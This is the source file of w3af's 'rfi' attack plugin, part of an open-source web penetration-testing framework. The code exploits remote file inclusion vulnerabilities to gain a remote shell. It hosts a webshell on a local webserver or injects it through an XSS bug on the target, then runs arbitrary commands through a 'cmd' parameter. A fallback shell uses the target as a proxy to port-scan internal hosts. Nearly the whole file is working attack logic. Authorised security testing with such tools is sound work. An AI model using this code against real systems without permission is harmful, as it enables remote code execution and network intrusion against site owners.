"""
rfi.py

Copyright 2006 Andres Riancho

This file is part of w3af, http://w3af.org/ .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

"""
import os
import socket
import textwrap

import w3af.core.controllers.output_manager as om
import w3af.core.data.kb.knowledge_base as kb
import w3af.core.controllers.daemons.webserver as webserver
import w3af.plugins.attack.payloads.shell_handler as shell_handler
import w3af.core.data.constants.ports as ports

from w3af.core.data.fuzzer.utils import rand_alnum
from w3af.core.data.options.opt_factory import opt_factory
from w3af.core.data.options.option_list import OptionList
from w3af.core.controllers.plugins.attack_plugin import AttackPlugin
from w3af.core.controllers.exceptions import BaseFrameworkException
from w3af.core.controllers.misc.home_dir import get_home_dir
from w3af.core.controllers.misc.get_local_ip import get_local_ip
from w3af.core.data.kb.exec_shell import ExecShell
from w3af.core.data.kb.shell import Shell
from w3af.plugins.attack.payloads.decorators.exec_decorator import exec_debug


NO_SUCCESS = 0
SUCCESS_COMPLETE = 1
SUCCESS_OPEN_PORT = 2


class rfi(AttackPlugin):
    """
    Exploit remote file include vulnerabilities.
    :author: Andres Riancho (andres.riancho@gmail.com)
    """

    def __init__(self):
        AttackPlugin.__init__(self)

        # Internal variables
        self._xss_vuln = None
        self._exploit_mutant = None

        # User configured variables
        self._listen_port = ports.RFI_SHELL
        self._listen_address = get_local_ip()
        self._use_XSS_vuln = True

    def can_exploit(self, vuln_to_exploit=None):
        """
        Searches the kb for vulnerabilities that this plugin can exploit, this
        is overloaded from AttackPlugin because I need to test for xss vulns
        also. This is a "complex" plugin.

        :param vuln_to_exploit: The id of the vulnerability to exploit.
        :return: True if plugin knows how to exploit a found vuln.
        """
        if not self._listen_address and not self._use_XSS_vuln:
            msg = 'You need to specify a local IP address where w3af can bind'\
                  ' an HTTP server that can be reached by the vulnerable Web'\
                  ' application.'
            om.out.error(msg)
            return False

        rfi_vulns = kb.kb.get('rfi', 'rfi')
        if vuln_to_exploit is not None:
            rfi_vulns = [v for v in rfi_vulns if v.get_id() == vuln_to_exploit]

        if not rfi_vulns:
            return False

        #
        # Ok, I have the RFI vulnerability to exploit, but... is the
        # plugin configured in such a way that exploitation is possible?
        #
        usable_xss = False
        if self._use_XSS_vuln:
            usable_xss = self._verify_xss_vuln()

        # Using the good old webserver (if properly configured)
        if not self._listen_address and not usable_xss:
            msg = 'You need to specify a local IP address where w3af can'\
                  ' bind an HTTP server that can be reached by the'\
                  ' vulnerable Web application.'
            om.out.error(msg)
            return False
        
        if self._listen_address and self._listen_port:
            # Start local webserver, raise an exception if something
            # fails
            webroot_path = os.path.join(get_home_dir(), 'webroot')
            try:
                webserver.start_webserver(self._listen_address,
                                          self._listen_port,
                                          webroot_path)
            except socket.error, se:
                msg = 'Failed to start the local web server to exploit the'\
                      ' RFI vulnerability, the exception was: "%s".'
                om.out.error(msg % se)
                return False
            
        return True

    def _verify_xss_vuln(self):
        """
        :return: True if we can use the XSS vulnerabilities in the KB to
                 exploit the RFI vulnerability.
        """
        xss_vulns = kb.kb.get('xss', 'xss')

        if not xss_vulns:
            msg = 'rfi plugin is configured to use a XSS bug to'\
                  ' exploit the RFI bug, but no XSS was found. The exploit'\
                  ' will use a local web server.'
            om.out.console(msg)

        #
        # I have some XSS vulns, lets see if they have what we need
        #
        # Set the test string
        test_string = '<?#@!()&=?>'

        for xss_vuln in xss_vulns:

            if xss_vuln.get_mutant().get_method() != 'GET':
                continue

            # Test if the current xss vuln works for us:
            xss_mutant = xss_vuln.get_mutant()
            xss_mutant = xss_mutant.copy()
            xss_mutant.set_token_value(test_string)

            try:
                http_res = self._uri_opener.send_mutant(xss_mutant)
            except:
                continue
            else:
                if test_string in http_res.get_body():
                    self._xss_vuln = xss_vuln
                    return True

        # Check If I really got something nice that I can use to exploit
        # if not, report it to the user
        if not self._xss_vuln:
            msg = 'rfi plugin is configured to use a XSS vulnerability'\
                  ' to exploit the RFI, but no XSS with the required'\
                  ' capabilities was found. The exploit will use a local'\
                  ' web server.'
            om.out.console(msg)
        
        return False

    def get_attack_type(self):
        """
        :return: The type of exploit, SHELL, PROXY, etc.
        """
        return 'shell'

    def get_kb_location(self):
        """
        This method should return the vulnerability name (as saved in the kb)
        to exploit. For example, if the audit.os_commanding plugin finds an vuln
        and saves it as:

        kb.kb.append( 'os_commanding' , 'os_commanding', vuln )

        Then the exploit plugin that exploits os_commanding
        (attack.os_commanding) should return 'os_commanding' in this method.
        """
        return ['rfi']

    def _generate_shell(self, vuln_obj):
        """
        :param vuln_obj: The vuln to exploit.
        :return: A shell object based on the vuln that is passed as parameter.
        """
        # Check if we really can execute commands on the remote server
        exploit_success = self._verify_vuln(vuln_obj)
        if exploit_success == SUCCESS_COMPLETE:

            # Create the shell object
            shell_obj = RFIShell(vuln_obj, self._uri_opener,
                                 self.worker_pool, self._exploit_mutant)
            return shell_obj

        elif exploit_success == SUCCESS_OPEN_PORT:

            # Create the portscan shell object
            shell_obj = PortScanShell(vuln_obj, self._uri_opener,
                                      self.worker_pool, self._exploit_mutant)
            return shell_obj

        else:
            return None

    def _verify_vuln(self, vuln):
        """
        This command verifies a vuln. This is really hard work!

        :return : True if vuln can be exploited.
        """
        extension = vuln.get_url().get_extension()

        # I get a list of tuples with file_content and extension to use
        shell_list = shell_handler.get_webshells(extension)

        for file_content, real_extension in shell_list:
            #
            # This for loop aims to exploit the RFI vulnerability and get remote
            # code execution.
            #
            if extension == '':
                extension = real_extension

            url_to_include = self._gen_url_to_include(file_content, extension)

            # Prepare for exploitation...
            mutant = vuln.get_mutant()
            mutant = mutant.copy()
            mutant.set_token_value(url_to_include)

            try:
                http_res = self._uri_opener.send_mutant(mutant)
            except:
                continue
            else:
                if shell_handler.SHELL_IDENTIFIER in http_res.body:
                    self._exploit_mutant = mutant
                    return SUCCESS_COMPLETE
                else:
                    # Remove the file from the local webserver webroot
                    self._rm_file(url_to_include)

        else:
            #
            #  We get here when it was impossible to create a RFI shell, but we
            #  still might be able to do some interesting stuff through error
            #  messages shown by the web application  
            #
            mutant = vuln.get_mutant()
            mutant = mutant.copy()
            # A port that should "always" be closed
            mutant.set_token_value('http://localhost:92/')

            try:
                http_response = self._uri_opener.send_mutant(mutant)
            except:
                return False
            else:
                rfi_errors = ['php_network_getaddresses: getaddrinfo',
                              'failed to open stream: Connection refused in']
                for error in rfi_errors:
                    if error in http_response.get_body():
                        return SUCCESS_OPEN_PORT

        return NO_SUCCESS

    def _gen_url_to_include(self, file_content, extension):
        """
        Generate the URL to include, based on the configuration it will return a
        URL pointing to a XSS bug, or our local webserver.
        """
        if self._use_XSS_vuln and self._xss_vuln:
            mutant = self._xss_vuln.get_mutant()
            mutant = mutant.copy()
            mutant.set_token_value(file_content)
            return mutant.get_uri().url_string

        else:
            # Write the php to the webroot
            filename = rand_alnum()
            filepath = os.path.join(get_home_dir(), 'webroot', filename)
            try:
                file_handler = open(filepath, 'w')
                file_handler.write(file_content)
                file_handler.close()
            except:
                raise BaseFrameworkException('Could not create file in webroot.')
            else:
                url_to_include = 'http://%s:%s/%s' % (self._listen_address,
                                                      self._listen_port,
                                                      filename)
                return url_to_include

    def _rm_file(self, url_to_include):
        """
        Remove the file in the webroot.

        PLEASE NOTE: This is duplicated code!! see the same note below.
        """
        if not self._use_XSS_vuln:
            # Remove the file
            filename = url_to_include.split('/')[-1:][0]
            os.remove(os.path.join(get_home_dir(), 'webroot', filename))

    def get_options(self):
        """
        :return: A list of option objects for this plugin.
        """
        ol = OptionList()
        
        d = 'IP address that the webserver will use to receive requests'
        h = 'w3af runs a webserver to serve the files to the target web app'\
            ' when doing remote file inclusions. This setting configures on'\
            ' what IP address the webserver is going to listen.'
        o = opt_factory('listen_address', self._listen_address, d, 'ip', help=h)
        ol.add(o)
        
        d = 'Port that the webserver will use to receive requests'
        h = 'w3af runs a webserver to serve the files to the target web app'\
            ' when doing remote file inclusions. This setting configures on'\
            ' what IP address the webserver is going to listen.'
        o = opt_factory('listen_port', self._listen_port, d, 'port', help=h)
        ol.add(o)
        
        d = 'Instead of including a file in a local webserver; include the '\
            ' result of exploiting a XSS bug within the same target site.'
        o = opt_factory('use_xss_bug', self._use_XSS_vuln, d, 'boolean')
        ol.add(o)
        
        return ol

    def set_options(self, options_list):
        """
        This method sets all the options that are configured using the user
        interface generated by the framework using the result of get_options().

        :param options_list: A map with the options for the plugin.
        :return: No value is returned.
        """
        self._listen_address = options_list['listen_address'].get_value()
        self._listen_port = options_list['listen_port'].get_value()
        self._use_XSS_vuln = options_list['use_xss_bug'].get_value()

    def get_root_probability(self):
        return 0.8

    def get_long_desc(self):
        """
        :return: A DETAILED description of the plugin functions and features.
        """
        return """
        This plugin exploits remote file inclusion vulnerabilities and returns a
        remote shell. The exploitation can be done using a more classic approach,
        in which the file to be included is hosted on a webserver that the plugin
        runs, or a nicer approach, in which a XSS bug on the remote site is used
        to generate the remote file to be included. Both ways work and return a
        shell, but the one that uses XSS will work even when a restrictive
        firewall is configured at the remote site.

        Four configurable parameters exist:
            - listen_address
            - listen_port
            - use_xss_bug
        """


class PortScanShell(Shell):
    """
    I create this shell when for some reason I was unable to create the
    RFIShell, AND the "include()" method is showing errors, allowing me to
    determine if a port is open or not.
    """
    def __init__(self, vuln, uri_opener, worker_pool, exploit_mutant):
        """
        Create the obj
        """
        super(PortScanShell, self).__init__(vuln, uri_opener, worker_pool)
        self._exploit_mutant = exploit_mutant

    def is_open_port(self, host, port):
        """
        :return: True if the host:port is open.
        """
        mutant = self._exploit_mutant.copy()
        mutant.set_token_value('http://%s:%s/' % (host, port))

        try:
            http_response = self._uri_opener.send_mutant(mutant)
        except BaseFrameworkException, w3:
            return 'Exception from the remote web application: "%s"' % w3
        except Exception, e:
            return 'Unhandled exception, "%s"' % e
        else:
            if 'HTTP request failed!' in http_response.get_body():
                # The port is open but it's not an HTTP daemon
                return True
            elif 'failed to open stream' not in http_response.get_body():
                # Open port, AND HTTP daemon
                return True
            else:
                return False

    def scan(self, host, port):
        return self.is_open_port(host, port)

    def get_name(self):
        return 'portscan-shell object'
    
    def identify_os(self):
        self._rOS = 'unknown'
        self._rSystem = 'PHP'
        self._rUser = 'unknown'
        self._rSystemName = 'unknown'

    def help(self, command):
        """
        Handle the help command.
        """
        if command == 'scan':
            _help = """\
            scan:
                Uses the SSRF vulnerability to scan a host's port using the
                vulnerable host as proxy.

            Examples:
                scan 127.0.0.1 8080
                scan 10.0.0.6 80
            """
        else:
            _help = """\
            Available commands:
                help                            Display this information
                scan                            Proxy port scanner
                exit                            Exit this shell session
            """
        return textwrap.dedent(_help)

    def __reduce__(self):
        """
        @see: Shell.__reduce__ to understand why this is required.
        """
        return self.__class__, (self._vuln, None, None, self._exploit_mutant)


class RFIShell(ExecShell, PortScanShell):
    """
    I create this shell when the remote host allows outgoing connections, or
    when the attack plugin was configured to use XSS vulnerabilities to exploit
    the RFI and a XSS vulnerability was actually found.
    """
    def __init__(self, vuln, uri_opener, worker_pool, exploit_mutant):
        PortScanShell.__init__(self, vuln, uri_opener, worker_pool,
                               exploit_mutant)
        ExecShell.__init__(self, vuln, uri_opener, worker_pool)

    @exec_debug
    def execute(self, command):
        """
        This method is called when a user writes a command in the shell and hits
        enter.

        Before calling this method, the framework calls the generic_user_input
        method from the shell class.

        :param command: The command to handle ( ie. "read", "exec", etc ).
        :return: The result of the command.
        """
        mutant = self._exploit_mutant.copy()
        uri = mutant.get_uri()
        uri.querystring.update([('cmd', [command])])

        try:
            http_res = self._uri_opener.send_mutant(mutant)
        except BaseFrameworkException, w3:
            return 'Exception from the remote web application: "%s"' % w3
        except Exception, e:
            return 'Unhandled exception from the remote web application: "%s"' % e
        else:
            return shell_handler.extract_result(http_res.get_body())

    def end(self):
        """
        Finish execution, clean-up, remove file.
        """
        om.out.debug('Remote file inclusion shell is cleaning up.')
        try:
            self._rm_file(self._exploit_mutant.get_token_value())
        except Exception, e:
            msg = 'Remote file inclusion shell cleanup failed with exception: %s'
            om.out.error(msg % e)
        else:
            om.out.debug('Remote file inclusion shell cleanup complete.')

    def get_name(self):
        return 'RFIShell'

    def _rm_file(self, url_to_include):
        """
        Remove the file from the web root.

        PLEASE NOTE: This is duplicated code!! see the same note above.
        """
        # Remove the file
        filename = url_to_include.split('/')[-1:][0]
        os.remove(os.path.join(get_home_dir(), 'webroot', filename))

    def __reduce__(self):
        """
        @see: Shell.__reduce__ to understand why this is required.
        """
        return self.__class__, (self._vuln, None, None, self._exploit_mutant)